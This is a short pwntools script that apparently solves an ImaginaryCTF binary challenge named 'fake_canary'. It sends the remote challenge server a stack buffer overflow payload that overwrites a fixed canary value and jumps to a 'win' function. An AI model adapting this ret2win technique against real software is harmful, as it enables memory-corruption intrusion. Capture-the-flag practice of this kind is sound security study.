from pwn import *

BIN = "./fake_canary"

canary = 0xdeadbeef
win = 0x400725
ret = 0x0000000000400536
def exploit():

  payload = b"a"*(0x30-0x8) + p64(canary) + b'b'*8 + p64(ret)  + p64(win)
  
  # _breakpoint = """
  #     b *0x00000000004006fd
  # """
  # gdb.attach(io, _breakpoint)
  io.recvuntil("What's your name?\n")
  io.sendline(payload)
  io.interactive()


#io = process(BIN)
io = remote("chal.imaginaryctf.org" ,42002)
# context.log_level='debug'
exploit()